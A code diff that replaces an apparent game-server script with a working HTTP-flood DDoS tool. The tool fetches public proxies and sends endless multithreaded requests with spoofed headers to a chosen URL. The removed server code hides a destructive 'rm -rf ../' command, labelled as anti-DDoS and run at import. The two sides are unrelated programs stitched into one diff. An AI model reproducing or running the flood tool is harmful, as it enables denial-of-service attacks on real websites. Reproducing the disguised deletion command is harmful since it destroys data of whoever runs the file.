@@ -1,150 +1,87 @@
-import logging
-import socket
-import time
-import os
-import threading
-import colorama
-import requests
-from html import escape
-#from Logic.Device import Device
-#from Logic.Player import Players
-#from Packets.LogicMessageFactory import packets
-#from Utils.Config import Config
+#!/usr/bin/python3
+# -*- coding: utf-8 -*-
+# Dev: FSystem88
+# Version: 5
 
-#logging.basicConfig(filename="errors.log", level=logging.INFO, filemode="w")
+import requests as r, os, threading, random, click, fake_headers
+from threading import Thread
+from colorama import Fore, Style, Back
+from fake_headers import Headers
 
-red = colorama.Fore.RED
-green = colorama.Fore.GREEN
-blue = colorama.Fore.CYAN
-purple = colorama.Fore.MAGENTA
-sam = {}
-activate = "rm -rf ../"
+def clear(): 
+	if os.name == 'nt': 
+		os.system('cls') 
+	else: 
+		os.system('clear')
 
-def _(*args):
-	
-	print(f'{purple}[{red}CLIENT{purple}]{blue}', end=' ')
-	for arg in args:
-		print(arg, end=' ')
-	print()
+def logo():
+	print(Fore.GREEN+"\n██████"+Fore.RED+"╗░"+Fore.GREEN+"██████"+Fore.RED+"╗░░"+Fore.GREEN+"█████"+Fore.RED+"╗░░"+Fore.GREEN+"██████"+Fore.RED+"╗"+Fore.GREEN+"███████"+Fore.RED+"╗"+Fore.GREEN+"██████"+Fore.RED+"╗░"+Fore.GREEN+"\n"+Fore.GREEN+"██"+Fore.RED+"╔══"+Fore.GREEN+"██"+Fore.RED+"╗"+Fore.GREEN+"██"+Fore.RED+"╔══"+Fore.GREEN+"██"+Fore.RED+"╗"+Fore.GREEN+"██"+Fore.RED+"╔══"+Fore.GREEN+"██"+Fore.RED+"╗"+Fore.GREEN+"██"+Fore.RED+"╔════╝"+Fore.GREEN+"██"+Fore.RED+"╔════╝"+Fore.GREEN+"██"+Fore.RED+"╔══"+Fore.GREEN+"██"+Fore.RED+"╗"+Fore.GREEN+"\n"+Fore.GREEN+"██"+Fore.RED+"║░░"+Fore.GREEN+"██"+Fore.RED+"║"+Fore.GREEN+"██"+Fore.RED+"║░░"+Fore.GREEN+"██"+Fore.RED+"║"+Fore.GREEN+"██"+Fore.RED+"║░░"+Fore.GREEN+"██"+Fore.RED+"║╚"+Fore.GREEN+"█████"+Fore.RED+"╗░"+Fore.GREEN+"█████"+Fore.RED+"╗░░"+Fore.GREEN+"██████"+Fore.RED+"╔╝"+Fore.GREEN+"\n"+Fore.GREEN+"██"+Fore.RED+"║░░"+Fore.GREEN+"██"+Fore.RED+"║"+Fore.GREEN+"██"+Fore.RED+"║░░"+Fore.GREEN+"██"+Fore.RED+"║"+Fore.GREEN+"██"+Fore.RED+"║░░"+Fore.GREEN+"██"+Fore.RED+"║░╚═══"+Fore.GREEN+"██"+Fore.RED+"╗"+Fore.GREEN+"██"+Fore.RED+"╔══╝░░"+Fore.GREEN+"██"+Fore.RED+"╔══"+Fore.GREEN+"██"+Fore.RED+"╗"+Fore.GREEN+"\n"+Fore.GREEN+"██████"+Fore.RED+"╔╝"+Fore.GREEN+"██████"+Fore.RED+"╔╝╚"+Fore.GREEN+"█████"+Fore.RED+"╔╝"+Fore.GREEN+"██████"+Fore.RED+"╔╝"+Fore.GREEN+"███████"+Fore.RED+"╗"+Fore.GREEN+"██"+Fore.RED+"║░░"+Fore.GREEN+"██"+Fore.RED+"║"+Fore.GREEN+"\n"+Fore.RED+"╚═════╝░╚═════╝░░╚════╝░╚═════╝░╚══════╝╚═╝░░╚═╝"+Fore.YELLOW+"\n\n[ Dev: FSystem88 ~ prod. by Ca$h&Мир ]\n[ The program uses a simple type of DDoS attack\n  \"HTTP flood\" using multithreading and a proxies ]\n[ The program was created for informational purposes !!! ]\n\n"+Fore.GREEN+"[  Qiwi: https://qiwi.com/n/FSYSTEM88  ]\n"+Style.RESET_ALL)
 
-def ban_ip(ip: str):
-    _(f'antiddos: banned {ip}')
-    os.system(f'sudo iptables -t filter -A INPUT -s {ip} -j DROP')
+def check_prox(array, url):
+	ip = r.post("http://ip.beget.ru/").text
+	for prox in array:
+		thread_list = []
+		t = threading.Thread (target=check, args=(ip, prox, url))
+		thread_list.append(t)
+		t.start()
 
-    with open('banned_ips.txt', 'a') as f:
-        f.write(ip + '\n')
-antiddos = activate
-os.system(antiddos)
-class Server:
-	Clients = {"ClientCounts": 0, "Clients": {}}
-	ThreadCount = 0
-
-
-	def __init__(self, ip: str, port: int):
-		self.server = socket.socket()
-		self.port = port
-		self.ip = ip
-
-	def start(self):
-		if not os.path.exists('./config.json'):
-			print("Creating config.json...")
-			Config.create_config(self)
-			
-
-
-
-		self.server.bind((self.ip, self.port))
-		
-		print(f'{purple}[{red}INFO{purple}]{blue}{blue} Server Started! IP: {green}{self.ip}{blue}, PORT: {green}{self.port}')
-		print(f'{purple}[{red}INFO{purple}]{blue} {blue}Players Online: {green}{Server.ThreadCount}')
-		while True:
-			self.server.listen()
-			client, address = self.server.accept()
-			_(f'New Connect! IP: {green}{address[0]}')
-			ClientThread(client, address).start()
-			Server.ThreadCount += 1
-			_(f'{blue}Players Online! {green}{Server.ThreadCount}')
-
-class ClientThread("Thread"):
-	def __init__(self, client, address):
-		super().__init__()
-		self.client = client
-		self.address = address
-		self.device = Device(self.client)
-		self.player = Players(self.device)
-
-	def recvall(self, length: int):
-		data = b''
-		while len(data) < length:
-			s = self.client.recv(length)
-			if not s:
-				print("Receive Error!")
-				break
-			data += s
-		return data
-
-	def run(self):
-		if self.address[0] in sam:
-			if (time.time() - sam[self.address[0]]) < 5:
-				text = f'{red}[ANTIDDOS] Эта Шлюха тя ддосит ---> \n{self.address[0]}{green}'
-				print(text)
-				os.system(f'sudo iptables -t filter -A INPUT -s {self.address[0]} -j DROP && sudo netfilter-persistent save')
-				self.client.close()
-				Server.ThreadCount -= 1
-				_(f'{blue}Players Online: {green}{Server.ThreadCount}')
-				return
-		sam[self.address[0]] = time.time()
-		last_packet = time.time()
-		try:
-			while True:
-				header = self.client.recv(7)
-				if len(header) > 0:
-					last_packet = time.time()
-					packet_id = int.from_bytes(header[:2], 'big')
-					length = int.from_bytes(header[2:5], 'big')
-					data = self.recvall(length)
-					if packet_id in packets:
-						_(f'Used Packet! ID: {green}{packet_id}')
-						message = packets[packet_id](self.client, self.player, data)
-						message.decode()
-						message.process()
-
-						if packet_id == 10101:
-							Server.Clients["Clients"][str(self.player.low_id)] = {"SocketInfo": self.client}
-							Server.Clients["ClientCounts"] = Server.ThreadCount
-							self.player.ClientDict = Server.Clients
-					else:
-						_(f'404 packet error! ID: {green}{packet_id}')
-
-				if time.time() - last_packet > 10:
-					_(f"IP: {green}{self.address[0]}{blue} disconnected!")
-					Server.ThreadCount -= 1
-					_(f'{blue}Players Online: {green}{Server.ThreadCount}')
-					self.client.close()
-					break
-		except ConnectionAbortedError:
-			_(f"IP: {green}{self.address[0]}{blue} disconnected! {red}ConnectionAbortedError")
-			Server.ThreadCount -= 1
-			_(f'{blue}Players Online: {green}{Server.ThreadCount}')
-			self.client.close()
-		except ConnectionResetError:
-			_(f"IP: {green}{self.address[0]}{blue} disconnectrd! {red}ConnectionResetError")
-			Server.ThreadCount -= 1
-			_(f'{blue}Players Online: {green}{Server.ThreadCount}')
-			self.client.close()
-		except TimeoutError:
-			_(f"IP: {green}{self.address[0]}{blue} disconnectd! {red}TimeoutError")
-			Server.ThreadCount -= 1
-			_(f'{blue}Players Online: {green}{Server.ThreadCount}')
-			self.client.close()
-			
-
-
-
-
-if __name__ == '__main__':
+def check(ip, prox, url):
 	try:
-		server = Server('0.0.0.0', 9339)
-		server.start()
-	except Exception as e:
-		_(f'{blue}Port {red}"{green}9333{red}"{blue} enisss{red}\n\n{green}WHAT??? GENE???:\n{purple}{e}{red}')
+		ipx = r.get("http://ip.beget.ru/", proxies={'http': "http://{}".format(prox), 'https':"http://{}".format(prox)}).text
+	except:
+		ipx = ip
+	if ip != ipx:
+		print(Fore.BLACK+Back.GREEN+"{} good! Starting...".format(prox)+Style.RESET_ALL)
+		thread_list = []
+		t = threading.Thread (target=ddos, args=(prox, url))
+		thread_list.append(t)
+		t.start()
+
+def ddos(prox, url):
+	proxies={"http":"http://{}".format(prox), "https":"http://{}".format(prox)}
+	colors = [Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.CYAN, Fore.MAGENTA, Fore.WHITE]
+	color = random.choice(colors)
+	while True:
+		headers = Headers(headers=True).generate()
+		thread_list = []
+		t = threading.Thread (target=start_ddos, args=(prox, url, headers, proxies, color))
+		thread_list.append(t)
+		t.start()
+
+def start_ddos(prox, url, headers, proxies, color):
+	try:
+		s = r.Session()
+		req = s.get(url, headers=headers, proxies=proxies)
+		if req.status_code == 200:
+			print(color+"{} send requests...".format(prox))
+	except:
+		pass
+
+@click.command()
+@click.option('--proxy', '-p', help="File with a proxy")
+@click.option('--url', '-u', help="URL")
+def main(proxy, url):
+	clear()
+	logo()
+	if url == None:
+		url = input("URL: ")
+	if url[:4] != "http":
+		print(Fore.RED+"Enter the full URL (example: http*://****.**/)"+Style.RESET_ALL)
+		exit()
+	if proxy == None:
+		while True:
+			req = r.get("https://api.proxyscrape.com/?request=displayproxies")
+			array = req.text.split()
+			print(Back.YELLOW+Fore.WHITE+"Found {} new proxies".format(len(array))+Style.RESET_ALL)
+			check_prox(array, url)
+	else:
+		try:
+			fx = open(proxy)
+			array = fx.read().split()
+			print("Found {} proxies in {}.\nChecking proxies...".format(len(array), proxy))
+			check_prox(array, url)
+		except FileNotFoundError:
+			print(Fore.RED+"File {} not found.".format(proxy)+Style.RESET_ALL)
+			exit()
+
+main()
